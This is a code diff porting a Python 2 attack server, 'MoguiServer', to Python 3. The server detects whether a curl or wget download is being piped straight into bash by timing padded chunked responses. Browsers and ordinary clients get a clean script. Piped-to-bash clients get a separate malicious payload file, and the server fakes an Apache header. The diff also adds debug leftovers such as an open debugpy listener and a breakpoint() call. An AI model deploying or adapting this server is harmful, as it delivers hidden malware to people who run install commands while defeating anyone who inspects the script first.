@@ -27,14 +27,18 @@
 
 from numpy import std
 import re
-import SocketServer
+import socketserver
 import socket
 import ssl
 import time
+import logging
+import debugpy
 
-class MoguiServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer):
+debugpy.listen(("localhost", 5678))
+class MoguiServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
     """HTTP server to detect curl | bash"""
-
+    logging.basicConfig(level=logging.DEBUG)
+    
     daemon_threads = True
     allow_reuse_address = True
     payloads = {}
@@ -50,22 +54,25 @@ class MoguiServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer):
         self.buffer_size = 87380
 
         # What to fill the tcp buffers with
-        self.padding = chr(0) * (self.buffer_size)
-
+        #self.padding = b"\x00" * (self.buffer_size)
+        self.padding = bytes(self.buffer_size)
         # Maximum number of blocks of padding - this
         # shouldn't need to be adjusted but may need to be increased
         # if its not working.
         self.max_padding = 16
 
         # HTTP 200 status code
-        self.packet_200 = ("HTTP/1.1 200 OK\r\n" + \
-                     "Server: Apache\r\n" + \
-                     "Date: %s\r\n" + \
-                     "Content-Type: text/plain; charset=us-ascii\r\n" + \
-                     "Transfer-Encoding: chunked\r\n" + \
-                     "Connection: keep-alive\r\n\r\n") % time.ctime(time.time())
+        packet_plain = (
+            "HTTP/1.1 200 OK\r\n"
+            "Server: Apache\r\n"
+            "Date: %s\r\n"
+            "Content-Type: text/plain; charset=us-ascii\r\n"
+            "Transfer-Encoding: chunked\r\n"
+            "Connection: keep-alive\r\n\r\n"
+        ) % time.ctime(time.time())
+        self.packet_200 = packet_plain.encode("ascii", errors="ignore")
 
-        SocketServer.TCPServer.__init__(self, server_address, HTTPHandler)
+        socketserver.TCPServer.__init__(self, server_address, HTTPHandler)
 
     def setssl(self, cert_file, key_file):
         """Sets SSL params for the server sockets"""
@@ -77,28 +84,35 @@ class MoguiServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer):
 
         (null, good, bad, min_jump, max_variance) = params
 
-        null = open(null, "r").read() # Base file with a delay
-        good = open(good, "r").read() # Non malicious payload
-        bad = open(bad, "r").read()   # Malicious payload
+        with open(null, "rb") as null_file:
+            null_payload = null_file.read()  # Base file with a delay
+        with open(good, "rb") as good_file:
+            good_payload = good_file.read()  # Non malicious payload
+        with open(bad, "rb") as bad_file:
+            bad_payload = bad_file.read()    # Malicious payload
 
-        self.payloads[uri] = (null, good, bad, min_jump, max_variance)
+        self.payloads[uri] = (null_payload, good_payload, bad_payload,
+                              min_jump, max_variance)
 
 
-
-class HTTPHandler(SocketServer.BaseRequestHandler):
+class HTTPHandler(socketserver.BaseRequestHandler):
     """Socket handler for MoguiServer"""
 
     def sendchunk(self, text):
         """Sends a single HTTP chunk"""
 
-        self.request.sendall("%s\r\n" % hex(len(text))[2:])
+
+
+        header = "%s\r\n" % hex(len(text))[2:]
+        breakpoint()
+        self.request.sendall(header.encode("utf-8", errors="ignore"))
         self.request.sendall(text)
-        self.request.sendall("\r\n")
+        self.request.sendall(b"\r\n")
 
     def log(self, msg):
         """Writes output to stdout"""
 
-        print "[%s] %s %s" % (time.time(), self.client_address[0], msg)
+        print("[%s] %s %s" % (time.time(), self.client_address[0], msg))
 
     def handle(self):
         """Handles inbound TCP connections from MoguiServer"""
@@ -122,11 +136,15 @@ class HTTPHandler(SocketServer.BaseRequestHandler):
 
         try:
             if self.server.ssl_options:
-                self.request = ssl.wrap_socket(self.request,
-                                               certfile=self.server.ssl_options[0],
-                                               keyfile=self.server.ssl_options[1],
-                                               server_side=True)
-        except ssl.SSLError:
+                
+                test = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
+                
+                test.load_cert_chain(certfile='cert.pem', keyfile='key.pem')
+                test.check_hostname = False
+                
+                self.request = test.wrap_socket(self.request,server_side=True)
+        except ssl.SSLError as e:
+            self.log(f"SSL negotiation failed: {e}")
             self.log("SSL negotiation failed")
             return
 
@@ -139,8 +157,16 @@ class HTTPHandler(SocketServer.BaseRequestHandler):
         except socket.error:
             self.log("No data received")
             return
+        except socket.timeout:
+            self.log("Socket read timed out")
+            return
 
-        uri = re.search("^GET ([^ ]+) HTTP/1.[0-9]", data)
+        if not data:
+            self.log("No data received")
+            return
+
+        #request_text = data.decode("iso-8859-1", errors="ignore")
+        uri = re.search(r"^GET ([^ ]+) HTTP/1\.[0-9]", data.decode("utf-8", errors="ignore"))
 
         if not uri:
             self.log("HTTP request malformed.")
@@ -160,12 +186,14 @@ class HTTPHandler(SocketServer.BaseRequestHandler):
         (payload_plain, payload_good, payload_bad, min_jump, max_var) = self.server.payloads[request_uri]
 
         # Send plain payload
+        self.log("Before payload plain")
 
         self.sendchunk(payload_plain)
-
-        if not re.search("User-Agent: (curl|Wget)", data):
+        self.log("After payload plain")
+        if not re.search(r"User-Agent: (curl|Wget)",  data.decode("utf-8", errors="ignore")):
+            self.log("Request not via curl/wget.")
             self.sendchunk(payload_good)
-            self.sendchunk("")
+            self.sendchunk(b"")
             self.log("Request not via wget/curl. Returning good payload.")
             return
 
@@ -173,7 +201,10 @@ class HTTPHandler(SocketServer.BaseRequestHandler):
         stime = time.time()
 
         for i in range(0, self.server.max_padding):
+            self.log("Sending padding block %s" % i)
+            self.log("Padding is %s" % self.server.padding)
             self.sendchunk(self.server.padding)
+            self.log("Didn't Crash Sending padding block %s" % i)
             timing.append(time.time() - stime)
 
         # ReLU curve analysis
@@ -197,7 +228,7 @@ class HTTPHandler(SocketServer.BaseRequestHandler):
             self.log("Sending good payload :(")
             self.sendchunk(payload_good)
 
-        self.sendchunk("")
+        self.sendchunk(b"")
         self.log("Connection closed.")
 
 
@@ -209,6 +240,7 @@ if __name__ == "__main__":
     SERVER = MoguiServer((HOST, PORT))
     SERVER.setscript("/setup.bash", ("ticker.sh", "good.sh", "bad.sh", 2.0, 0.1))
     SERVER.setssl("cert.pem", "key.pem")
-
-    print "Listening on %s %s" % (HOST, PORT)
+    
+    print("Listening on %s %s" % (HOST, PORT))
+    
     SERVER.serve_forever()
